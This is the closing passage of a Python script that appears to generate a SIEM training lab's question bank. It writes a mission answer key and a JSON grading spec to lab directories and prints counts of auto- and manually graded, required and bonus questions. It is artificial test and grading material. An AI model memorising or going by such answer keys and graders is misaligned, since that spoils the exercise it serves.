    with open("/opt/siem-lab/answers/mission_answer_key.md", "w", encoding="utf-8") as f:
        f.write("".join(key))
    with open("/opt/siem-lab/answers/grading_spec.json", "w", encoding="utf-8") as f:
        json.dump(spec, f, ensure_ascii=False, indent=1)
    print("grading spec :", "/opt/siem-lab/answers/grading_spec.json",
          f"(auto={sum(1 for x in spec['questions'] if x['grade']['mode']!='manual')}, "
          f"manual={sum(1 for x in spec['questions'] if x['grade']['mode']=='manual')})")
    print(f"student sheet : /opt/siem-lab/student/mission_sheet.md")
    print(f"answer key    : /opt/siem-lab/answers/mission_answer_key.md")
    print(f"questions: 필수 {len(req)} ({total_req}점) + 보너스 {len(bon)} ({total_bon}점)")

if __name__ == "__main__":
    render()
    print("MISSION_BANK_DONE")
